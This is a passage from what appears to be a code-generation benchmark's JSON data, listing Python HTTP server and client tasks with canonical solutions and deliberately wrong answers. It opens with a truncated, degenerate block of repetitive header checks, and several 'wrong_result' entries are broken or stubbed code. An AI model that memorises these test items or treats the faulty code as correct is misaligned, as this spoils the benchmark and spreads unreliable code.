line.startswith(\"List-Unsubscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Post-Help:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Help:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Help:\"):\n                        continue\n                    if line.startswith(\"List-Help-Help:\"):\n                        continue\n                    if line.startswith(\"List-Info-Help:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Post-Info:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Info:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Info:\"):\n                        continue\n                    if line.startswith(\"List-Help-Info:\"):\n                        continue\n                    if line.startswith(\"List-Info-Info:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Post-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Post:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Post:\"):\n                        continue\n                    if line.startswith(\"List-Help-Post:\"):\n                        continue\n                    if line.startswith(\"List-Info-Post:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Post-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Help-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Info-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Post-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Info-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Help:\"):\n                        continue\n                    if line.startswith"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport threading\nimport queue\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom urllib.parse import urlparse\nimport webbrowser\nimport socket\n\nclass TestServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    def __init__(self):\n        self.to_server_queue = queue.Queue()\n        self.from_server_queue = queue.Queue()\n        self.server = None\n        self.server_thread = None\n\n    @classmethod\n    def setUpClass(cls):\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT), cls.REQUEST_HANDLER_CLASS)\n        cls.server_thread = threading.Thread(target=cls.server.serve_forever)\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server_thread.join()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        if non_blocking:\n            return self.from_server_queue.get_nowait() if not self.from_server_queue.empty() else None\n        return self.from_server_queue.get()\n\n    def open_url(self, path):\n        url = f'http://{self.LOCAL_IP}:{self.PORT}{path}'\n        webbrowser.open(url)\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def do_GET(self):\n        parsed_path = urlparse(self.path)\n        if parsed_path.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self.get_last_html())\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def get_last_html(self):\n        return self.last_html\n\n    def recv_from_testsuite(self, non_blocking=False):\n        if non_blocking:\n            return self.server.test_suite_queue.get_nowait() if not self.server.test_suite_queue.empty() else None\n        return self.server.test_suite_queue.get()\n\n    def send_to_testsuite(self, value):\n        self.server.test_suite_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n```"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Implement a class for handling HTTP requests to a server, supporting both GET and POST methods, with optional proxy support and response parsing capabilities.\n\nClass Description: WARequest is a class designed to facilitate HTTP communication with a server. It provides methods for sending GET and POST requests, handling response parsing, and managing request parameters and headers. The class supports both direct connections and proxy connections.\n\nAttributes:\n\npvars: [list] - List of variables that can be parsed from the response\nport: [int] - Port number for the HTTP connection (default: 443)\ntype: [str] - HTTP request type (GET or POST)\nparser: [ResponseParser] - Parser object for processing the response\nparams: [list] - List of tuples containing request parameters\nheaders: [dict] - Dictionary of HTTP headers to be sent with the request\nsent: [bool] - Flag indicating if the request has been sent\nresponse: [HTTPResponse] - The response object from the server\nurl: [str] - The target URL for the request\n\nMethods:\n\nsetParsableVariables: [setParsableVariables](pvars: list) -> None - Sets the list of variables that can be parsed from the response\naddParam: [addParam](name: str, value: str) -> None - Adds a parameter to the request\nremoveParam: [removeParam](name: str) -> None - Removes a parameter from the request\naddHeaderField: [addHeaderField](name: str, value: str) -> None - Adds a header field to the request\nclearParams: [clearParams]() -> None - Clears all request parameters\ngetUserAgent: [getUserAgent]() -> str - Returns the user agent string\nsend: [send](parser: ResponseParser = None) -> dict - Sends the request (GET or POST based on type) and returns parsed response\nsetParser: [setParser](parser: ResponseParser) -> None - Sets the response parser\ngetConnectionParameters: [getConnectionParameters]() -> tuple - Returns host, port, and path from the URL\nsendGetRequest: [sendGetRequest](parser: ResponseParser = None) -> dict - Sends a GET request and returns parsed response\nsendPostRequest: [sendPostRequest](parser: ResponseParser = None) -> dict - Sends a POST request and returns parsed response\nsendRequest: [sendRequest](host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse - Static method to send a direct HTTP request\nsendRequestWithProxy: [sendRequestWithProxy](host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict - Static method to send a request through a proxy\nbuild_get_url: [build_get_url](host: str, path: str, params: list) -> str - Static method to build a GET URL\nbuild_headers: [build_headers](headers_tuple: dict) -> list - Static method to convert headers dictionary to curl format",
    "Canonical_solution": "import urllib\nimport sys\nimport os\nimport logging\nfrom http import client as httplib\nfrom urllib.parse import urlencode\nfrom .httpproxy import HttpProxy\nfrom yowsup.env import YowsupEnv\n\nlogger = logging.getLogger(__name__)\n\nclass WARequest:\n    OK = 200\n\n    def __init__(self):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        for i in range(0, len(self.params)):\n            if self.params[i][0] == name:\n                del self.params[i]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return YowsupEnv.getCurrent().getUserAgent()\n\n    def send(self, parser=None):\n        if self.type == \"POST\":\n            return self.sendPostRequest(parser)\n        return self.sendGetRequest(parser)\n\n    def setParser(self, parser):\n        if isinstance(parser, ResponseParser):\n            self.parser = parser\n        else:\n            logger.error(\"Invalid parser\")\n\n    def getConnectionParameters(self):\n        if not self.url:\n            return \"\", \"\", self.port\n\n        try:\n            url = self.url.split(\"://\", 1)\n            url = url[0] if len(url) == 1 else url[1]\n            host, path = url.split('/', 1)\n        except ValueError:\n            host = url\n            path = \"\"\n\n        path = \"/\" + path\n        return host, self.port, path\n\n    def sendGetRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta()\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        proxy = HttpProxy.getFromEnviron()\n        if proxy is None:\n            self.response = WARequest.sendRequest(host, port, path, headers, params, \"GET\")\n            if not self.response.status == WARequest.OK:\n                logger.error(\"Request not success, status was %s\" % self.response.status)\n                return {}\n\n            data = self.response.read()\n            logger.info(data)\n            self.sent = True\n            return parser.parse(data.decode(), self.pvars)\n        else:\n            logger.info(\"Request with proxy\")\n            self.response = WARequest.sendRequestWithProxy(host, port, path, headers, params, proxy)\n            logger.info(self.response)\n            return self.response\n\n    def sendPostRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta(),\n                           \"Content-Type\": \"application/x-www-form-urlencoded\"\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        self.response = WARequest.sendRequest(host, port, path, headers, params, \"POST\")\n\n        if not self.response.status == WARequest.OK:\n            logger.error(\"Request not success, status was %s\" % self.response.status)\n            return {}\n\n        data = self.response.read()\n        logger.info(data)\n        self.sent = True\n        return parser.parse(data.decode(), self.pvars)\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        params = urlencode(params)\n        path = path + \"?\" + params if reqType == \"GET\" and params else path\n\n        if len(headers):\n            logger.debug(headers)\n        if len(params):\n            logger.debug(params)\n\n        logger.debug(\"Opening connection to %s\" % host)\n        conn = httplib.HTTPSConnection(host, port) if port == 443 else httplib.HTTPConnection(host, port)\n\n        logger.debug(\"Sending %s request to %s\" % (reqType, path))\n        conn.request(reqType, path, params, headers)\n        response = conn.getresponse()\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        import pycurl\n        import json\n        from io import BytesIO\n        logger.info(\"SENDING PROXY REQUEST WITH %s\" % proxy.getHost())\n        bytes_buffer = BytesIO()\n        c = pycurl.Curl()\n        c.setopt(pycurl.URL, WARequest.build_get_url(host, path, params))\n        c.setopt(pycurl.PROXY, proxy.getHost())\n        c.setopt(pycurl.PROXYPORT, proxy.getPort())\n        if proxy.getUserName() is not None:\n            c.setopt(pycurl.PROXYUSERPWD, \"%s:%s\" % (proxy.getUser(), proxy.getPassword()))\n        c.setopt(pycurl.PORT, port)\n        c.setopt(pycurl.HTTPHEADER, WARequest.build_headers(headers))\n        c.setopt(pycurl.WRITEDATA, bytes_buffer)\n        c.perform()\n        c.close()\n        data = bytes_buffer.getvalue().decode('utf-8')\n        return json.loads(data)\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        params = urlencode(params)\n        url = 'https://' + host + path + \"?\" + params\n        return url\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers_array = []\n        for idx in headers_tuple:\n            headers_array.append(idx + \":\" + headers_tuple[idx])\n        return headers_array",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nclass WARequest:\n    def __init__(self, url):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n        self.url = url\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        self.params = [param for param in self.params if param[0] != name]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return self.headers.get(\"User-Agent\", \"\")\n\n    def send(self, parser=None):\n        if parser:\n            self.setParser(parser)\n        if self.type == \"GET\":\n            return self.sendGetRequest()\n        else:\n            return self.sendPostRequest()\n\n    def setParser(self, parser):\n        self.parser = parser\n\n    def getConnectionParameters(self):\n        url_parts = urlparse(self.url)\n        host = url_parts.netloc\n        path = url_parts.path\n        if not path:\n            path = \"/\"\n        if \":\" in host:\n            host, port = host.split(\":\")\n            self.port = int(port)\n        return host, self.port, path\n\n    def sendGetRequest(self):\n        host, port, path = self.getConnectionParameters()\n        url = self.build_get_url(host, path, self.params)\n        headers = self.build_headers(self.headers)\n        self.response = self.sendRequest(host, port, path, headers, self.params, \"GET\")\n        return self.parseResponse()\n\n    def sendPostRequest(self):\n        host, port, path = self.getConnectionParameters()\n        headers = self.build_headers(self.headers)\n        self.response = self.sendRequest(host, port, path, headers, self.params, \"POST\")\n        return self.parseResponse()\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        # Implementation of sending a direct HTTP request\n        pass\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        # Implementation of sending a request through a proxy\n        pass\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        # Implementation of building a GET URL\n        pass\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        # Implementation of converting headers dictionary to curl format\n        pass\n\n    def parseResponse(self):\n        # Implementation of parsing the response\n        pass\n```"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the `http.server` module to handle GET and POST requests, with custom response handling and error management.\n\nClass Description: The `YamlComposerHttp` class encapsulates an HTTP server that listens on a specified port and handles incoming GET and POST requests. It includes an inner class `_HttpServer` that extends `BaseHTTPRequestHandler` to define custom request handling logic.\n\nAttributes:\n\n- args: [object] - Configuration object containing server parameters, including the HTTP port to listen on.\n\nMethods:\n\n- __init__(args) -> None - Initializes the `YamlComposerHttp` instance with the provided configuration.\n  - Input: \n    - args: [object] - Configuration object containing server parameters.\n  - Output: None\n\n- run() -> None - Starts the HTTP server and begins listening for incoming requests indefinitely until interrupted.\n  - Input: None\n  - Output: None\n\nInner Class: _HttpServer(BaseHTTPRequestHandler)\n\nMethods:\n\n- _set_response(msg: str, code: int = 200) -> None - Helper method to send an HTTP response with the specified message and status code.\n  - Input:\n    - msg: [str] - The message to include in the response body.\n    - code: [int] - The HTTP status code (default: 200).\n  - Output: None\n\n- do_GET() -> None - Handles incoming GET requests. Responds with a default HTML page for the root path ('/') or an error for invalid paths.\n  - Input: None\n  - Output: None\n\n- do_POST() -> None - Handles incoming POST requests. Processes form data from '/generate' path or returns an error for invalid paths.\n  - Input: None\n  - Output: None",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    class _HttpServer(BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200):\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if str(self.path) != '/':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            self._set_response(self.default_html)\n\n        def do_POST(self):\n            if str(self.path) != '/generate':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            content_length = int(self.headers['Content-Length'])\n            data = self.rfile.read(content_length)\n            data = {k: v[0] for k, v in parse_qs(data.decode('utf-8')).items()}\n            self._set_response(*parse_http_data(data, self.args))\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.args.http_port), self._HttpServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            httpd.server_close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport urllib.parse\nimport os\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    def run(self):\n        port = self.args.http_port\n        Handler = self._HttpServer\n        with socketserver.TCPServer((\"\", port), Handler) as httpd:\n            print(f\"Starting server on port {port}...\")\n            httpd.serve_forever()\n\n    class _HttpServer(http.server.BaseHTTPRequestHandler):\n        def _set_response(self, msg, code=200):\n            self.send_response(code)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(bytes(msg, \"utf8\"))\n\n        def do_GET(self):\n            if self.path == \"/\":\n                self._set_response(\"<html><body><h1>Welcome to the YamlComposer HTTP Server</h1></body></html>\")\n            else:\n                self._set_response(\"Invalid path\", 404)\n\n        def do_POST(self):\n            if self.path == \"/generate\":\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length)\n                parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))\n                # Process form data here\n                self._set_response(\"Form data received\")\n            else:\n                self._set_response(\"Invalid path\", 404)\n```\n"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server capable of handling POST requests to receive and process file uploads with metadata, then store the files locally and register them via an API.\n\nClass Description: HTTPPostHandler is a class that sets up an HTTP server to handle file uploads via POST requests. It processes JSON payloads containing file data (base64 encoded), metadata, and stores the decoded files in a specified directory while registering them through an external API.\n\nAttributes:\n- OUTPUT_DIR: str - The base directory where uploaded files will be stored\n- port: int - The port number on which the HTTP server will listen\n\nMethods:\n- __init__(output_dir: str = '', port: int = 80) -> None - Initializes the HTTPPostHandler with optional output directory and port parameters\n- run() -> None - Starts the HTTP server and begins listening for requests indefinitely\n\nNested Class: Handler (extends BaseHTTPRequestHandler)\nMethods:\n- _set_headers() -> None - Sets the HTTP response headers for successful requests\n- do_POST() -> None - Handles POST requests, processes the incoming file data and metadata, saves the file to disk, and registers it via API",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport string\nimport random\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir='', port=80):\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_POST(self):\n            self._set_headers()\n            self.data_string = self.rfile.read(int(self.headers['Content-Length']))\n            self.send_response(200)\n            self.end_headers()\n\n            json_data = json.loads(self.data_string)\n            b64_data = json_data.get('data')\n            filetype = json_data.get('type')\n            owner = json_data.get('owner')\n            module = json_data.get('module')\n            session = json_data.get('session')\n            filename = json_data.get('filename')\n\n            data = base64.b64decode(b64_data)\n            if session.startswith('_b64'):\n                session = base64.b64decode(session[6:]).decode('ascii')\n\n            if not filetype.startswith('.'):\n                filetype = '.' + filetype\n\n            if not filename:\n                filename = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + filetype\n\n            output_path = os.path.join(self.OUTPUT_DIR, owner, 'files', filename)\n\n            requests.post(\"http://0.0.0.0/api/file/add\", {\"filename\": filename, \"owner\": owner, \"module\": module, \"session\": session})\n\n            with open(output_path, 'wb') as fp:\n                fp.write(data)\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.port), self.Handler)\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport os\nimport json\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    OUTPUT_DIR = ''\n    port = 80\n\n    def __init__(self, output_dir: str = '', port: int = 80) -> None:\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    def run(self) -> None:\n        server_address = ('', self.port)\n        httpd = HTTPServer(server_address, Handler)\n        print(f'Starting server on port {self.port}...')\n        httpd.serve_forever()\n\nclass Handler(BaseHTTPRequestHandler):\n    def _set_headers(self) -> None:\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n\n    def do_POST(self) -> None:\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data)\n\n        file_data = data['file']\n        metadata = data['metadata']\n\n        file_name = file_data['name']\n        file_content = base64.b64decode(file_data['content'])\n\n        if not os.path.exists(self.server.OUTPUT_DIR):\n            os.makedirs(self.server.OUTPUT_DIR)\n\n        file_path = os.path.join(self.server.OUTPUT_DIR, file_name)\n        with open(file_path, 'wb') as file:\n            file.write(file_content)\n\n        # Register file via API\n        api_url = 'https://example.com/api/register'\n        response = requests.post(api_url, json={'file_path': file_path, 'metadata': metadata})\n        if response.status_code == 200:\n            print(f'File {file_name} registered successfully.')\n        else:\n            print(f'Failed to register file {file_name}.')\n\n        self._set_headers()\n        self.wfile.write(json.dumps({'message': 'File uploaded and registered successfully.'}).encode())\n```\n"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server using the http.server module, capable of handling GET requests with customizable response status codes and running in a separate thread.\n\nClass Description: The HttpServer class provides a lightweight HTTP server implementation that can be started and stopped programmatically. It handles GET requests, supports custom response status codes via URL paths, and runs in a daemon thread for non-blocking operation.\n\nAttributes:\n\nDEFAULT_RESPONSE: bytes - Default response body sent for successful requests (default: b\"Hello!\")\nserver: HTTPServer - Instance of the HTTP server\nserver_thread: Thread - Thread running the server's serve_forever loop\n\nMethods:\n\n__init__: () -> None - Initializes the HttpServer instance with server and server_thread set to None\ncreate_server: () -> HTTPServer - Creates and returns an HTTPServer instance bound to localhost on an available port\nrun_server: () -> Tuple[Thread, HTTPServer] - Starts the server in a daemon thread and returns both the thread and server objects\nstart: () -> None - Convenience method to start the server (calls run_server and stores the results)\nshutdown: () -> None - Stops the server and joins the server thread if they exist\n\nNested Class: Handler(BaseHTTPRequestHandler) - Custom request handler for processing HTTP requests\n\nHandler Attributes:\nprotocol_version: str - HTTP protocol version (default: \"HTTP/1.1\")\ntimeout: int - Connection timeout in seconds (default: 3)\nSTATUS_RE: Pattern - Regular expression for matching status code paths\n\nHandler Methods:\ndo_GET: () -> None - Handles GET requests, supports /status/{code} paths to return specific status codes",
    "Canonical_solution": "import re\nfrom http import HTTPStatus\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    class Handler(BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n\n        STATUS_RE = re.compile(r\"/status/(\\d+)\")\n\n        def do_GET(self):\n            status_match = self.STATUS_RE.fullmatch(self.path)\n            status = 200\n            if status_match:\n                status = int(status_match.group(1))\n            if status == 200:\n                body = HttpServer.DEFAULT_RESPONSE\n                self.send_response(HTTPStatus.OK)\n                self.send_header(\"Content-Length\", str(len(body)))\n                self.end_headers()\n                self.wfile.write(body)\n            else:\n                self.send_error(status)\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self):\n        server_address = (\"127.0.0.1\", 0)\n        return HTTPServer(server_address, self.Handler)\n\n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = Thread(\n            target=self.server.serve_forever, daemon=True, name=\"Test server worker\"\n        )\n        self.server_thread.start()\n        return self.server_thread, self.server\n\n    def start(self):\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom re import compile\nfrom socketserver import ThreadingMixIn\nfrom typing import Tuple\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self) -> HTTPServer:\n        return HTTPServer(('localhost', 0), Handler)\n\n    def run_server(self) -> Tuple[Thread, HTTPServer]:\n        self.server = self.create_server()\n        self.server_thread = Thread(target=self.server.serve_forever, daemon=True)\n        self.server_thread.start()\n        return self.server_thread, self.server\n\n    def start(self) -> None:\n        self.run_server()\n\n    def shutdown(self) -> None:\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()\n\nclass Handler(BaseHTTPRequestHandler, ThreadingMixIn):\n    protocol_version = \"HTTP/1.1\"\n    timeout = 3\n    STATUS_RE = compile(r\"/status/(\\d{3})\")\n\n    def do_GET(self) -> None:\n        match = self.STATUS_RE.match(self.path)\n        if match:\n            status_code = int(match.group(1))\n            self.send_response(status_code)\n            self.end_headers()\n            self.wfile.write(HttpServer.DEFAULT_RESPONSE)\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(HttpServer.DEFAULT_RESPONSE)\n```"
  },
  {
    "Task_id": 223,
